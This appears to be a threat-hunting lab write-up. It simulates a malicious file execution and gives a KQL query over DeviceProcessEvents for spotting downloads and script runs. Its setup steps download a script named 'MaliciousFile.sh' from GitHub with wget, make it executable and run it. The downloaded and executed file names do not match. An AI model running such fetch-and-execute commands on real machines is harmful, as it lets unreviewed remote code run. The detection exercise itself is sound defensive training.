
# Threat Event (Malicious File Execution)

## Steps the "Bad Actor" took to Create Logs and IoCs:

1. Downloaded a malicious file to the machine. `wget https://raw.githubusercontent.com/Goodka7/Threat-Hunting-Malicious-Execution-/refs/heads/main/resources/MaliciousFile.sh`
2. Make the file executable. `chmod +x malicious_script.sh`
3. Execute the malicious file, simulating a compromise. `./malicious_script.sh`

## Tables Used to Detect IoCs:

| **Parameter** | **Description** |
|--------------|----------------|
| **Name** | DeviceProcessEvents |
| **Info** | https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table |
| **Purpose** | Used to detect the download, execution or modification of malicious files. |

## Related Queries:

```kql

DeviceProcessEvents
| where InitiatingProcessFileName in ("wget", "curl", "bash", "python", "perl")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessAccountDomain, InitiatingProcessFileName, ProcessCommandLine
| order by Timestamp desc
```

---

## Created By:
- **Author Name**: James Harrington
- **Author Contact**: https://www.linkedin.com/in/Goodk47
- **Date**: Febuary 5, 2025

## Validated By:
- **Reviewer Name**:
- **Reviewer Contact**:
- **Validation Date**:

---

## Additional Notes:
**None**
